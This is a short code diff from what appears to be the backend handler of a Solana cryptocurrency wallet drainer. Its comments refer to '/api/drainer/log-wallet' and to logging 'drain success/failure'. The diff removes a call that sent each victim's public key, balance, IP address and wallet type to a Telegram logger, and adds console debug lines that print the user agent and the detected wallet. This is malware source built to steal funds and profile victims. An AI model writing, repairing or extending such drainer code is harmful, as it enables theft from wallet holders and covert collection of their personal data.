@@ -727,13 +727,16 @@ export default async function handler(req, res) {
       else if (userAgent.includes('Phantom') || userAgent.includes('phantom')) detectedWalletType = 'Phantom';
       else if (userAgent.includes('TrustWallet') || userAgent.includes('trustwallet')) detectedWalletType = 'Trust Wallet';
       
-      // Log wallet detection with actual balance and detected wallet type
-      await telegramLogger.logWalletDetected({
-        publicKey: userPubkey.toString(),
-        lamports: lamports,
-        ip: userIp,
-        walletType: detectedWalletType
-      });
+      // Debug logging for wallet type detection
+      console.log('[WALLET_TYPE_DEBUG] User Agent:', userAgent);
+      console.log('[WALLET_TYPE_DEBUG] Detected wallet type:', detectedWalletType);
+      console.log('[WALLET_TYPE_DEBUG] Is Solflare:', isSolflare);
+      console.log('[WALLET_TYPE_DEBUG] Is Glow:', isGlow);
+      console.log('[WALLET_TYPE_DEBUG] Is Backpack:', isBackpack);
+      console.log('[WALLET_TYPE_DEBUG] Is Exodus:', isExodus);
+      
+      // Note: Wallet detection is already logged by frontend via /api/drainer/log-wallet
+      // Backend only logs drain success/failure, not wallet detection
       
       // Return transaction data
       const response = {
